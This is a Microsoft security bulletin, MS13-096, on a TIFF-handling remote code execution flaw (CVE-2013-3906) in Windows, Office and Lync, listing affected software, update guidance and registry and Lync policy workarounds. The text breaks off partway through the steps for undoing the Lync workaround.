=== Content from docs.microsoft.com_bf6a4bdd_20250125_124244.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2013/ms13-096.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 03/01/2023
* 6 contributors

Feedback

## In this article

Security Bulletin

# Microsoft Security Bulletin MS13-096 - Critical

## Vulnerability in Microsoft Graphics Component Could Allow Remote Code Execution (2908005)

Published: December 10, 2013 | Updated: December 20, 2013

**Version:** 1.2

### General Information

#### Executive Summary

This security update resolves a publicly disclosed vulnerability in Microsoft Windows, Microsoft Office, and Microsoft Lync. The vulnerability could allow remote code execution if a user views content that contains specially crafted TIFF files.

This security update is rated Critical for all supported editions of Windows Vista, Windows Server 2008, Microsoft Office 2003, Microsoft Office 2007, Microsoft Office 2010, Microsoft Office Compatibility Pack, and Microsoft Office viewers. It is rated Important for all supported editions of Microsoft Lync 2010 and Microsoft Lync 2013. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerability by correcting the way the affected software handles TIFF files. For more information about the vulnerability, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update addresses the vulnerability first described in [Microsoft Security Advisory 2896666](https://technet.microsoft.com/security/advisory/2896666).

**Recommendation.** Most customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update immediately using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

#### Knowledge Base Article

| Knowledge Base Article | [2908005](https://support.microsoft.com/kb/2908005) |
| --- | --- |
| File information | Yes |
| SHA1/SHA2 hashes | Yes |
| Known issues | None |

#### Affected and Non-Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| Operating System | Maximum Security Impact | Aggregate Severity Rating | Updates Replaced |
| --- | --- | --- | --- |
| Windows Vista |  |  |  |
| [Windows Vista Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=fd0f3c4d-a741-44ef-b566-29ed95ae9228) (2901674) | Remote Code Execution | Critical | None |
| [Windows Vista x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=420c49f6-65aa-41b5-9f34-1f0384f6c394) (2901674) | Remote Code Execution | Critical | None |
| Windows Server 2008 |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=4d1beef2-ef8e-4cc6-a30b-e5e87f996d4d) (2901674) | Remote Code Execution | Critical | None |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=797e74b7-bc2b-4ea5-9629-0e56b9590087) (2901674) | Remote Code Execution | Critical | None |
| [Windows Server 2008 for Itanium-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=64931aa3-9aea-42af-af12-81bd3055e2da) (2901674) | Remote Code Execution | Critical | None |
| Server Core installation option |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=4d1beef2-ef8e-4cc6-a30b-e5e87f996d4d) (Server Core installation) (2901674) | Remote Code Execution | Critical | None |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=797e74b7-bc2b-4ea5-9629-0e56b9590087) (Server Core installation) (2901674) | Remote Code Execution | Critical | None |

**Microsoft Office**

| Office Software | Maximum Security Impact | Aggregate Severity Rating | Updates Replaced |
| --- | --- | --- | --- |
| Microsoft Office 2003 |  |  |  |
| [Microsoft Office 2003 Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=bfc3b881-4b95-4a22-998d-048487406d4f) (2850047) | Remote Code Execution | Critical | 2817480 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Microsoft Office 2007 |  |  |  |
| [Microsoft Office 2007 Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=3d373aba-eec3-4b76-ae95-9270a82e2e7e)[1](2817641) | Remote Code Execution | Critical | 2687309 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Microsoft Office 2010 |  |  |  |
| [Microsoft Office 2010 Service Pack 1 (32-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Office 2010 Service Pack 2 (32-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Office 2010 Service Pack 1 (64-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=212b55fd-5fb6-42e2-8eca-5bf2b5429963) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Office 2010 Service Pack 2 (64-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=212b55fd-5fb6-42e2-8eca-5bf2b5429963) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Other Office Software |  |  |  |
| [Microsoft Office Compatibility Pack Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=3d373aba-eec3-4b76-ae95-9270a82e2e7e)[1](2817641) | Remote Code Execution | Critical | 2687309 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Word Viewer](https://www.microsoft.com/download/details.aspx?familyid=bfc3b881-4b95-4a22-998d-048487406d4f)[1](2850047) | Remote Code Execution | Critical | 2817480 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Excel Viewer](https://www.microsoft.com/download/details.aspx?familyid=3d373aba-eec3-4b76-ae95-9270a82e2e7e)[1](2817641) | Remote Code Execution | Critical | 2687309 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft PowerPoint 2010 Viewer Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117)[1](2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft PowerPoint 2010 Viewer Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117)[1](2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |

[1]The update for Microsoft Office 2003 also applies to Microsoft Word Viewer. The update for Microsoft Office 2007 also applies to Microsoft Office Compatibility Pack and to Microsoft Excel Viewer. The update for Microsoft Office 2010 also applies to Microsoft PowerPoint 2010 Viewer.

**Microsoft Communications Platforms and Software**

| Software | Maximum Security Impact | Aggregate Severity Rating | Updates Replaced |
| --- | --- | --- | --- |
| Microsoft Lync 2010 |  |  |  |
| [Microsoft Lync 2010](https://www.microsoft.com/download/details.aspx?familyid=3059df02-78c3-4d9c-bd9b-c3882b19bfb0) (32-bit) (2899397) | Remote Code Execution | Important | 2843160 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2010](https://www.microsoft.com/download/details.aspx?familyid=03f29527-50be-4435-adfc-279a245f3a4a) (64-bit) (2899397) | Remote Code Execution | Important | 2843160 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2010 Attendee](https://www.microsoft.com/download/details.aspx?familyid=946a1af1-d30b-4d77-a847-5f3538027db1)[1](user level install) (2899393) | Remote Code Execution | Important | 2843162 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2010 Attendee](https://www.microsoft.com/download/details.aspx?familyid=734d08ee-135e-4f11-9b77-0c75b0687e3e) (admin level install) (2899395) | Remote Code Execution | Important | 2843163 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Microsoft Lync 2013 |  |  |  |
| [Microsoft Lync 2013](https://www.microsoft.com/download/details.aspx?familyid=6e134ef0-8ce5-421e-a4b5-b37ad8160eab) (32-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync Basic 2013](https://www.microsoft.com/download/details.aspx?familyid=6e134ef0-8ce5-421e-a4b5-b37ad8160eab) (32-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2013](https://www.microsoft.com/download/details.aspx?familyid=fc8667cd-cc80-4014-8981-8cb86f04d2f3) (64-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync Basic 2013](https://www.microsoft.com/download/details.aspx?familyid=fc8667cd-cc80-4014-8981-8cb86f04d2f3) (64-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |

[1]This update is available from the Microsoft Download Center only. See the **Update FAQ** section for more information.

**Non-Affected Software**

| Operating System |
| --- |
| Windows XP Service Pack 3[1] |
| Windows XP Professional x64 Edition Service Pack 2[1] |
| Windows Server 2003 Service Pack 2[1] |
| Windows Server 2003 x64 Edition Service Pack 2[1] |
| Windows Server 2003 for Itanium-based Systems Service Pack 2[1] |
| Windows 7 for 32-bit Systems Service Pack 1[1] |
| Windows 7 for x64-based Systems Service Pack 1[1] |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1[1] |
| Windows Server 2008 R2 for Itanium-based Systems Service Pack 1[1] |
| Windows 8 for 32-bit Systems[1] |
| Windows 8 for x64-based Systems[1] |
| Windows 8.1 for 32-bit Systems[1] |
| Windows 8.1 for x64-based Systems[1] |
| Windows RT[1] |
| Windows RT 8.1[1] |
| Windows Server 2012[1] |
| Windows Server 2012 R2[1] |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)[1] |
| Windows Server 2012 (Server Core installation)[1] |
| Windows Server 2012 R2 (Server Core installation)[1] |
| Microsoft Office Suites and Software |
| Microsoft Office 2013 (32-bit editions) |
| Microsoft Office 2013 (64-bit editions) |
| Microsoft Office 2013 RT |
| Microsoft Communication Platforms and Software |
| Microsoft Speech Server 2004 |
| Microsoft Speech Server 2004 R2 |
| Microsoft Live Meeting 2007 Console |
| Microsoft Live Communications Server 2003 |
| Microsoft Live Communications Server 2005 Service Pack 1 |
| Microsoft Communicator 2005 |
| Microsoft Communicator 2005 Web Access |
| Microsoft Communicator 2007 |
| Microsoft Communicator 2007 R2 |
| Microsoft Communicator 2007 Web Access |
| Microsoft Communications Server 2007 |
| Microsoft Communications Server 2007 Speech Server |
| Microsoft Communications Server 2007 R2 |
| Microsoft Communicator 2007 R2 Attendant |
| Microsoft Communicator 2007 R2 Group Chat Admin |
| Microsoft Communicator 2007 R2 Group Chat Client |
| Microsoft Communicator for Mac 2011 |
| Microsoft Lync for Mac 2011 |
| Microsoft Lync 2010 Attendant (32-bit) |
| Microsoft Lync 2010 Attendant (64-bit) |
| Microsoft Lync Server 2010 |
| Microsoft Lync Server 2013 |
| Microsoft Lync Web Access 2013 |

[1]These editions of Microsoft Windows are not affected if you do not have an affected version of Microsoft Office or Microsoft Lync installed on the platform.

## Update FAQ

**If I applied the automated Microsoft Fix it solution previously described in Microsoft Security Advisory 2896666, should I** **undo the workaround after applying this update?**

Yes, customers should undo the workaround after applying this update. If you do not undo the workaround at some point, you will not be able to properly view TIFF files.

To undo the **Microsoft Fix it solution**, you can follow the steps in [Microsoft Knowledge Base Article 2908005](https://support.microsoft.com/kb/2908005).

**If I applied the** **Disable data collaboration in Lync workaround** **previously described in Microsoft Security Advisory 2896666,** **should I** **undo the workaround after applying this update?**

Yes, customers who have disabled collaboration in Lync should undo the workaround after applying the update. If you do not undo the workaround, you will not be able to share and collaborate on PowerPoint files, polls, and Whiteboard during Lync meetings.

To undo the **Disable data collaboration in Lync** workaround, see the **Workarounds** section in this bulletin.

**Based on the configuration of my system, how do I know if my system is affected?**

Even if you are running an operating system that is not affected, your system could still be vulnerable if you have an affected version of Microsoft Office or Microsoft Lync installed. Refer to the following table to verify whether your system might be affected through a version of Office or Lync, and to verify the updates that are applicable to your configuration:

| Affected Software | Installed on Windows XP[1] | Installed on Windows Server 2003 Service Pack 2 | Installed on Windows Vista Service Pack 2 | Installed on Windows Server 2008 Service Pack 2 | Installed on Windows 7 Service Pack 1 | Installed on Windows Server 2008 R2 Service Pack 1 | Installed on Windows 8 | Installed on Windows 8.1 | Installed on Windows Server 2012 | Installed on Windows Server 2012 R2 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Microsoft Office 2003 Service Pack 3 | Affected\ (Update 2850047) | Affected\ (Update 2850047) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] |
| Microsoft Office 2007 Service Pack 3 | Under active attack\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) |
| Microsoft Office 2010 Service Pack 1 (32-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2010 Service Pack 2 (32-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2010 Service Pack 1 (64-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2010 Service Pack 2 (64-bit editions) | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2013 (32-bit editions) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2013 (64-bit editions) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office 2013 RT | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Office Compatibility Pack Service Pack 3 | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) |
| Microsoft Word Viewer | Affected\ (Update 2850047) | Affected\ (Update 2850047) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047 and Update 2901674) | Affected\ (Update 2850047) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] |
| Microsoft Excel Viewer | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641 and Update 2901674) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) | Affected\ (Update 2817641) |
| Microsoft PowerPoint 2010 Viewer Service Pack 1 | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft PowerPoint 2010 Viewer Service Pack 2 | Affected\ (Update 2817670) | Affected\ (Update 2817670) | Affected\ (Update 2901674) | Affected\ (Update 2901674) | Not affected | Not affected | Not affected | Not affected | Not affected | Not affected |
| Microsoft Lync 2010 (32-bit) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) |
| Microsoft Lync 2010 (64-bit) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397 and Update 2901674) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) | Affected\ (Update 2899397) |
| Microsoft Lync 2010 Attendee (user level install) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393 and Update 2901674) | Affected\ (Update 2899393 and Update 2901674) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) | Affected\ (Update 2899393) |
| Microsoft Lync 2010 Attendee (admin level install) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395 and Update 2901674) | Affected\ (Update 2899395 and Update 2901674) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) | Affected\ (Update 2899395) |
| Microsoft Lync 2013 (32-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |
| Microsoft Lync Basic 2013 (32-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |
| Microsoft Lync 2013 (64-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |
| Microsoft Lync Basic 2013 (64-bit) | Not applicable[2] | Not applicable[2] | Not applicable[2] | Not applicable[2] | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) | Affected\ (Update 2850057) |

[1]Applies to Windows XP Service Pack 3 and Windows XP Professional x64 Edition Service Pack 2.

[2]Not a supported configuration for Microsoft Office or Microsoft Lync. It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. To determine the support lifecycle for your software release, see [Select a Product for Lifecycle Information](https://go.microsoft.com/fwlink/?linkid=169555).

**I am being offered this update for software that is not specifically listed in the Affected Software table. Why am I being offered this update?**

When updates address vulnerable code that exists in a component that is shared between multiple Microsoft Office products or shared between multiple versions of the same Microsoft Office product, the update is considered to be applicable to all supported products and versions that contain the vulnerable component.

For example, when an update applies to Microsoft Office 2007 products, only Microsoft Office 2007 may be specifically listed in the Affected Software table. However, the update could apply to Microsoft Word 2007, Microsoft Excel 2007, Microsoft Visio 2007, Microsoft Compatibility Pack, Microsoft Excel Viewer, or any other Microsoft Office 2007 product that is not specifically listed in the Affected Software table.

For example, when an update applies to Microsoft Office 2010 products, only Microsoft Office 2010 may be specifically listed in the Affected Software table. However, the update could apply to Microsoft Word 2010, Microsoft Excel 2010, Microsoft Visio 2010, Microsoft Visio Viewer, or any other Microsoft Office 2010 product that is not specifically listed in the Affected Software table.

For more information on this behavior and recommended actions, see Microsoft Knowledge Base Article 830335. For a list of Microsoft Office products an update may apply to, refer to the Microsoft Knowledge Base Article associated with the specific update.

**I am being offered this update for software that is not vulnerable. Why am I being offered this update?**

In some cases, an update may apply to Microsoft Office products that are specifically listed in the Non-Affected Software table or that are otherwise listed in the Affected Software table with "Not applicable" for security impact. For example, you may be offered a Microsoft Office security update even though this security bulletin indicates that the Office products or the version of the Office products that you do have installed are not affected. For more information on this behavior, see [Microsoft Knowledge Base Article 830335](https://support.microsoft.com/kb/830335).

**I do** **not have Microsoft Lync 2013 software installed. Why am I being offered an update for Microsoft Lync 2013?**

You may be offered an update for Microsoft Lync 2013 even though you do not have the affected software installed, if you have Microsoft Office software that contains the vulnerable shared component of Microsoft Office 2013 and Microsoft Lync 2013. Note that because the software does not access the vulnerable code, the software is not affected by the vulnerability. However, since the vulnerable code is present, this update will be offered.

**Does the offer to update a non-vulnerable version of Microsoft Office software constitute an issue in the servicing model for Microsoft Office updates?**

No. The servicing model is based on how the update applies to shared components of Microsoft Office software. Some of the products offered an update may not access the vulnerable code, and thus the software is not affected by the vulnerability. However, the update mechanism is functioning correctly in that it detects a product version for applicable software on the system that is within the range of product versions that the update applies to, and thus offers the update. This helps to maintain consistency for shared files across Office products.

**Why is the Lync 2010 Attendee (user level install) update only available from the Microsoft Download Center?**

Microsoft is releasing the update for Lync 2010 Attendee (user level install) to the [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129) only. Because the user level installation of Lync 2010 Attendee is handled through a Lync session, distribution methods such as automatic updating are not appropriate for this type of installation scenario.

**I am using an older release of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin has been tested to determine which releases are affected. Other releases are past their support life cycle. For more information about the product lifecycle, see the [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742) website.

It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. To determine the support lifecycle for your software release, see [Select a Product for Lifecycle Information](https://go.microsoft.com/fwlink/?linkid=169555). For more information about service packs for these software releases, see [Service Pack Lifecycle Support Policy](https://go.microsoft.com/fwlink/?linkid=89213).

Customers who require custom support for older software must contact their Microsoft account team representative, their Technical Account Manager, or the appropriate Microsoft partner representative for custom support options. Customers without an Alliance, Premier, or Authorized Contract can contact their local Microsoft sales office. For contact information, see the [Microsoft Worldwide Information](https://go.microsoft.com/fwlink/?linkid=33329) website, select the country in the Contact Information list, and then click **Go** to see a list of telephone numbers. When you call, ask to speak with the local Premier Support sales manager. For more information, see the [Microsoft Support Lifecycle Policy FAQ](https://go.microsoft.com/fwlink/?linkid=169557).

### **Vulnerability Information**

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [December bulletin summary](https://technet.microsoft.com/security/bulletin/ms13-dec). For more information, see [Microsoft Exploitability Index](https://technet.microsoft.com/security/cc998259).

| Affected Software | Microsoft Graphics Component Memory Corruption Vulnerability - CVE-2013-3906 | Aggregate Severity Rating |
| --- | --- | --- |
| Windows Vista |  |  |
| Windows Vista Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Vista x64 Edition Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 for Itanium-based Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Server Core installation option |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office |  |  |
| Microsoft Office 2003 Service Pack 3 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office 2007 Service Pack 3 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office 2010 Service Pack 1 (32-bit editions) | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office 2010 Service Pack 1 (64-bit editions) | **Critical** Remote Code Execution | **Critical** |
| Microsoft Office Compatibility Pack Service Pack 3 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Word Viewer | **Critical** Remote Code Execution | **Critical** |
| Microsoft Excel Viewer | **Critical** Remote Code Execution | **Critical** |
| Microsoft PowerPoint 2010 Viewer Service Pack 1 | **Critical** Remote Code Execution | **Critical** |
| Microsoft PowerPoint 2010 Viewer Service Pack 2 | **Critical** Remote Code Execution | **Critical** |
| Microsoft Lync |  |  |
| Microsoft Lync 2010 (32-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2010 (64-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2010 Attendee (user level install) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2010 Attendee (admin level install) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2013 (32-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync Basic 2013 (32-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync 2013 (64-bit) | **Important** Remote Code Execution | **Important** |
| Microsoft Lync Basic 2013 (64-bit) | **Important** Remote Code Execution | **Important** |

## Microsoft Graphics Component Memory Corruption Vulnerability - CVE-2013-3906

A remote code execution vulnerability exists in the way that affected Windows components and other affected software handle specially crafted TIFF files. The vulnerability could allow remote code execution if a user views TIFF files in shared content. An attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2013-3906](https://www.cve.org/CVERecord?id=CVE-2013-3906).

#### Mitigating Factors

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* An attacker who successfully exploited this vulnerability could gain the same user rights as the current user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

#### Workarounds

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Disable the TIFF codec**

  **Note** See [Microsoft Knowledge Base Article 2908005](https://support.microsoft.com/kb/2908005) to use the automated **Microsoft Fix it** solution to enable or disable this workaround.

  **Note** This workaround is not applicable to Windows 8, Windows 8.1, Windows Server 2012, Windows Server 2012 R2, Windows RT, and Windows RT 8.1.

  You can prevent TIFF files from being displayed by modifying the registry to control the parsing of the TIFF codec. By changing the registry entries, you can control which images are parsed and rendered and which images are rejected in GDI+. For example, you can select to parse and render Joint Photographic Experts Group (JPEG) images, but block Tagged Image File Format (TIFF) images.

  **Warning**: If you use Registry Editor incorrectly, you may cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that you can solve problems that result from using Registry Editor incorrectly. Use Registry Editor at your own risk.

  **Note** After you change a registry entry, you must restart the application that uses the codec.

  To disable the TIFF codec:

  1. To add a registry entry, create one of the following registry subkeys for the
     appropriate Windows platform:

     For 32-bit systems:

     HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Gdiplus

     For 32-bit applications on 64-bit systems:

     HKEY\_LOCAL\_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Gdiplus

     For 64-bit systems:

     HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Gdiplus
  2. Create a **DWORD** value for the TIFF code by creating a registry entry (**DWORD** value) under the registry subkey you created in step 1:

     **DisableTIFFCodec**
  3. To disable the TIFF codec, set value of the **DisableTIFFCodec** registry entry to **1**.

  **Impact of Workaround.** You will not be able to view TIFF files using any of the affected products.

  **How to undo the workaround**

  To re-enable the TIFF codec, set the value of the **DisableTIFFCodec** registry entry to **0**.
* **Disable data collaboration in Lync**

  Enterprise users who manage directly a Lync server can prevent PowerPoint files (which may be used as an attack vector to send specially crafted TIFF files) from being shared through Lync by using the Lync Server Control Panel to modify the Lync conferencing policy for data collaboration.

  **For Lync 2010 and Lync 2013:**

  1. Open the Lync Control Panel. For details about the different methods you can use to start Lync Server Control Panel, see [Open Lync Server Administrative Tools](https://technet.microsoft.com/library/gg195741.aspx).
  2. In the left navigation bar, click **Conferencing** and then click **Conferencing Policy**.
  3. In the list of conferencing policies, click **Data collaboration**, click **Edit**, and then click **Show details**.
  4. To prevent data collaboration, in **Edit Conferencing Policy**, click **None**. The default setting is **Enable data collaboration**.
  5. Click **Commit**.

  **Impact of Workaround.** Users will not be able to share and collaborate on PowerPoint files, polls, and Whiteboard during Lync meetings.

  **How to undo the workaround**

  To re-enable data collaboration:

